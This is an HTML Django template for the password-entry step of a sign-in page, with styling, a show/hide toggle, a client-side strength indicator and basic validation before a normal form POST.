<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Sign in — Password</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#f4f7fb;
      --card:#ffffff;
      --primary:#0b57a4;
      --accent:#1f86e3;
      --muted:#6b7280;
      --danger:#dc2626;
      --radius:12px;
      --shadow: 0 6px 18px rgba(13, 38, 63, 0.08);
      font-family: 'Inter', system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      background:linear-gradient(180deg, #eef6ff 0%, var(--bg) 100%);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:28px;
      color:#0f172a;
    }

    .card{
      width:100%;
      max-width:520px;
      background:var(--card);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
      padding:28px;
      border:1px solid rgba(15,23,42,0.04);
    }

    .brand{
      display:flex;
      gap:12px;
      align-items:center;
      margin-bottom:14px;
    }
    .logo {
      width:48px;
      height:48px;
      border-radius:10px;
      background:linear-gradient(135deg,var(--primary),var(--accent));
      display:flex;
      align-items:center;
      justify-content:center;
      color:white;
      font-weight:700;
      font-size:18px;
      box-shadow: 0 6px 14px rgba(15,23,42,0.06);
    }
    h1{ margin:0; font-size:18px; }
    .sub { margin:6px 0 0; color:var(--muted); font-size:13px; }

    form{ margin-top:18px; }
    label{ display:block; font-size:14px; margin-bottom:8px; font-weight:600; }
    .input-row{ display:flex; align-items:center; gap:10px; }
    .password-wrap{
      position:relative; flex:1;
    }
    input[type="password"], input[type="text"]{
      width:100%;
      padding:12px 44px 12px 14px;
      border-radius:10px;
      border:1px solid rgba(15,23,42,0.09);
      font-size:15px;
      outline:none;
      transition: box-shadow .12s, border-color .12s;
    }
    input:focus{
      box-shadow: 0 6px 18px rgba(31, 134, 227, 0.12);
      border-color:var(--accent);
    }
    .toggle-visibility{
      position:absolute;
      right:8px;
      top:50%;
      transform:translateY(-50%);
      background:transparent;
      border:none;
      padding:6px;
      cursor:pointer;
      font-size:13px;
      color:var(--muted);
      border-radius:8px;
    }

    .hint{font-size:13px;color:var(--muted); margin-top:10px}
    .error-box{
      background:#fff5f5;
      border:1px solid rgba(220,38,38,0.12);
      color:var(--danger);
      padding:10px 12px;
      border-radius:8px;
      margin-bottom:12px;
      font-size:14px;
    }
    .inline-error{ color:var(--danger); font-size:13px; margin-top:8px; display:none; }

    .strength {
      margin-top:8px;
      font-size:13px;
      color:var(--muted);
    }
    .strength.weak{ color:var(--danger); }
    .strength.good{ color:#f59e0b; }
    .strength.strong{ color:var(--primary); }

    .actions{
      display:flex;
      gap:12px;
      align-items:center;
      margin-top:16px;
    }
    button.submit {
      padding:10px 16px;
      background:linear-gradient(90deg,var(--primary),var(--accent));
      color:white;
      border:none;
      border-radius:10px;
      font-weight:600;
      cursor:pointer;
      display:inline-flex;
      align-items:center;
      gap:10px;
      transition: transform .06s;
    }
    button.submit:active{ transform:translateY(1px) }
    button[disabled]{ opacity:0.65; cursor:not-allowed; }

    a.link {
      font-size:13px;
      color:var(--accent);
      text-decoration:none;
    }

    @media (max-width:480px){
      .card{ padding:18px; border-radius:10px; }
    }
  </style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="login-title">
    <header class="brand" aria-hidden="false">
      <div class="logo" aria-hidden="true">M</div>
      <div>
        <h1 id="login-title">Enter your password</h1>
        <p class="sub">Sign in as <strong>{{ email }}</strong> — Domain: <span style="font-weight:600">{{ domain }}</span></p>
      </div>
    </header>

    {% if error %}
      <div class="error-box" role="alert">{{ error }}</div>
    {% endif %}

    <form id="login-form" method="post" novalidate>
      {% csrf_token %}

      <label for="password">Password</label>
      <div class="input-row" aria-live="polite">
        <div class="password-wrap">
          <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Enter your password" required minlength="8" />
          <button type="button" id="toggle" class="toggle-visibility" aria-label="Show password">Show</button>
        </div>
      </div>
      <div id="pw-error" class="inline-error" role="alert"></div>
      <div id="pw-strength" class="strength">Password must be at least 8 characters.</div>

      <div class="actions">
        <button type="submit" class="submit" id="submit-btn" aria-label="Sign in">
          <span id="btn-text">Sign in</span>
          <svg id="btn-spinner" class="visually-hidden" width="18" height="18" viewBox="0 0 50 50" aria-hidden="true">
            <circle cx="25" cy="25" r="20" stroke="white" stroke-width="4" stroke-linecap="round" fill="none" stroke-dasharray="31.4 31.4"></circle>
          </svg>
        </button>

        <div style="margin-left:auto; display:flex; gap:10px; align-items:center;">
          <a class="link" href="{% url 'identify' %}">Change email</a>
          <!-- Optional: forgot password route (uncomment if exists) -->
          <a class="link" href="#">Forgot password?</a>
        </div>
      </div>

      <p class="hint" style="margin-top:14px">Tip: use your corporate account password. Make sure Caps Lock is off.</p>
    </form>
  </main>

  <script>
    (function(){
      const form = document.getElementById('login-form');
      const pw = document.getElementById('password');
      const toggle = document.getElementById('toggle');
      const pwError = document.getElementById('pw-error');
      const pwStrength = document.getElementById('pw-strength');
      const submitBtn = document.getElementById('submit-btn');
      const btnText = document.getElementById('btn-text');
      const btnSpinner = document.getElementById('btn-spinner');

      function showError(msg){
        pwError.textContent = msg;
        pwError.style.display = msg ? 'block' : 'none';
        pw.setAttribute('aria-invalid', !!msg);
      }

      toggle.addEventListener('click', () => {
        if(pw.type === 'password'){
          pw.type = 'text';
          toggle.textContent = 'Hide';
          toggle.setAttribute('aria-label','Hide password');
        } else {
          pw.type = 'password';
          toggle.textContent = 'Show';
          toggle.setAttribute('aria-label','Show password');
        }
        pw.focus();
      });

      // very simple strength estimate
      function assessStrength(s){
        if(!s || s.length < 8) return {label: 'Too short', cls: 'weak'};
        let score = 0;
        if(/[a-z]/.test(s)) score++;
        if(/[A-Z]/.test(s)) score++;
        if(/[0-9]/.test(s)) score++;
        if(/[\W_]/.test(s)) score++;
        if(s.length >= 12) score++;
        if(score <= 1) return {label:'Very weak', cls:'weak'};
        if(score <= 3) return {label:'Moderate', cls:'good'};
        return {label:'Strong', cls:'strong'};
      }

      pw.addEventListener('input', () => {
        const val = pw.value || '';
        const assessment = assessStrength(val);
        pwStrength.textContent = assessment.label === 'Too short'
          ? 'Password must be at least 8 characters.'
          : `Strength: ${assessment.label}`;
        pwStrength.className = 'strength ' + assessment.cls;

        // simple inline validation message
        if(val && val.length < 8){
          showError('Password must be at least 8 characters.');
        } else {
          showError('');
        }
      });

      form.addEventListener('submit', (e) => {
        // client-side validations
        const value = pw.value || '';
        if(!value){
          e.preventDefault();
          showError('Password is required.');
          pw.focus();
          return false;
        }
        if(value.length < 8){
          e.preventDefault();
          showError('Password must be at least 8 characters.');
          pw.focus();
          return false;
        }
        // disallow leading/trailing whitespace
        if(/^\s|\s$/.test(value)){
          e.preventDefault();
          showError('Password cannot start or end with spaces.');
          pw.focus();
          return false;
        }

        // on pass: disable button + show spinner and allow normal POST
        submitBtn.disabled = true;
        btnText.style.display = 'none';
        btnSpinner.classList.remove('visually-hidden');
        return true;
      });

      // Accessibility: hide spinner initially (CSS class .visually-hidden used by identify.html)
      // Re-enable submit if user interaction after server error page reloads is handled by server (page re-render).
    })();
  </script>
</body>
</html>
